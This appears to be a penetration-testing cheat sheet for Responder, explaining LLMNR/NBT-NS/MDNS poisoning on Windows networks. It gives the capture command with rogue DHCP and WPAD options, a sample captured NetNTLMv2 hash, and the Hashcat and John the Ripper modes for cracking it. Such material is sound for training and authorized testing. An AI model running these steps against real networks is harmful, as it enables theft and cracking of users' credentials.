# Responder: LLMNR / NBT-NS Poisoning & Credential Capture

Responder is an offensive security tool designed to exploit Windows broadcast name resolution protocols (LLMNR, NBT-NS, and MDNS) on local area networks to capture NetNTLMv1 and NetNTLMv2 authentication hashes.

---

## 1. Operating Mechanism

```text
[ Windows Workstation ]
           │
           │ 1. Broadcast query for non-existent share (e.g., \\corpshare)
           ▼
[ Local Subnet (UDP 5355 / 137) ]
           │
           ▼
[ Responder Listener (Kali Linux) ]
  ├── 1. Claims ownership: "I am corpshare!"
  ├── 2. Issues NTLM authentication challenge (Nonce)
  └── 3. Captures NetNTLMv2 response hash: [DOMAIN\User::Hash...]
```

When a Windows machine cannot resolve a hostname via DNS, it broadcasts LLMNR/NBT-NS queries to the local network. Responder answers these queries claiming to be the target host, forcing the victim machine to authenticate via NTLM and capturing the password hash.

---

## 2. Essential Commands & Options

### 2.1 Standard Capture Command
```bash
sudo responder -I eth0 -dwv
```

* `-I <interface>`: Specifies the network interface to bind to (e.g., `eth0`, `ens33`).
* `-d`: Enables DHCP rogue server detection and responses.
* `-w`: Starts the WPAD (Web Proxy Auto-Discovery) rogue proxy server.
* `-v`: Verbose mode (displays detailed traffic logs and captured hashes in real time).

### 2.2 Analyzing Captured Hashes
Captured hashes are saved automatically in `/usr/share/responder/logs/`:

```text
[SMB] NTLMv2-SSP Hash     : jsmith::CORP.LOCAL:1122334455667788:AABBCCDDEEFF...
```

The captured hash can be loaded directly into **Hashcat** (`-m 5600`) or **John the Ripper** (`--format=netntlmv2`) for offline dictionary cracking.
